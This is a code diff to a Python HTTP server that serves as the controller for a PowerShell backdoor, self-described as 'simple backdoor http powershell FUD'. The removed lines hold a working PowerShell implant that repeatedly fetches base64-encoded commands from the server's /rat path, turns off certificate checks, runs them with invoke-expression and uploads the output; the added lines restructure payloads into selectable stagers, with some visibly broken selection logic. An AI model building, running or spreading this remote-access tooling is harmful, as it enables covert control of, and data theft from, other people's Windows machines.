@@ -1,34 +1,9 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import base64
 import argparse
-
-
-code =   """
-            function getUser() {{
-                $string = ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) | Out-String
-                $string = $string.Trim()
-                return $string
-            }}
-            function getComputerName() {{
-                $string = (Get-WmiObject Win32_OperatingSystem).CSName | Out-String
-                $string = $string.Trim()
-                return $string
-            }}
-            $resp = "http://{SERVER}:{PORT}/rat"
-            $w = New-Object Net.WebClient
-	        while($true)
-	        {{
-	        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}
-	        $r_get = $w.DownloadString($resp)
-            $d = [System.Convert]::FromBase64String($r_get);
-            $Ds = [System.Text.Encoding]::UTF8.GetString($d);
-	        while($r_get) {{
-		        $output = invoke-expression $Ds | out-string
-		        $w.UploadString($resp, $output)
-		        break
-	        }}
-	        }}
-        """
+from payloads import *
+from sys import exit
+stage_activated = None
 
 class myHandler(BaseHTTPRequestHandler):
     
@@ -40,7 +15,7 @@ class myHandler(BaseHTTPRequestHandler):
             self.send_response(200)
             self.send_header('Content-type', 1)
             self.end_headers()
-            self.wfile.write(code.encode())
+            self.wfile.write(stage_activated.getCode().encode())
         
         elif "/rat" == self.path:
             self.send_response(200)
@@ -58,12 +33,40 @@ class myHandler(BaseHTTPRequestHandler):
             self.send_header('Content-type', 'text/plain')
             self.end_headers()
 
-d = dict()
-d['SERVER'] = '192.168.174.131'
-d['PORT'] = '8000'
-code = code.format(**d)
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description="ps_backdoor - simple backdoor http powershell FUD")
+    parser.add_argument('-i','--ip-addr',  dest='ip',help='set the ip address to server',default='0.0.0.0')
+    parser.add_argument('-p','--port',  dest='port',help='set the port the handler',default=8000)
+    parser.add_argument('-s','--stage',  dest='stage',help='set payload shell ',default=None)
+    parser_load = parser.parse_args()
+    print('Author: Curso Security TOol {} ')
+    print('[*] Starting the server...')
+    print('[*] HOST: {}:{}'.format(parser_load.ip,parser_load.port))
+
+    
+    all_stagers = base.BasePayload.__subclasses__()
+    stagers = {}
+    for stage in all_stagers:
+        stagers[stage.getName().lower()] = stage()
 
 
-server = HTTPServer(('',8000), myHandler)
-print("[*] Aguardando clientes...")
-server.serve_forever()
+    if (parser_load.stage == None):
+        if (parser_load.stage.lower() in list(stagers.keys())):
+            for stage in stagers.keys():
+                if (stagers[stage].getActivated()):
+                    stage_activated = stagers[stage]
+    else:
+        stage_activated = stagers[parser_load.stage.lower()]
+
+    print("[*] plugin: " + stage_activated.getName())
+    if (stage_activated == None):
+        exit("[!] the payload {} not found!".format(parser_load.stage))
+
+    try:
+        stage_activated.setHandler(parser_load.ip, parser_load.port)
+        server = HTTPServer((parser_load.ip, int(parser_load.port)), myHandler)
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print('^C received, shutting down the web server')
+        server.socket.close()
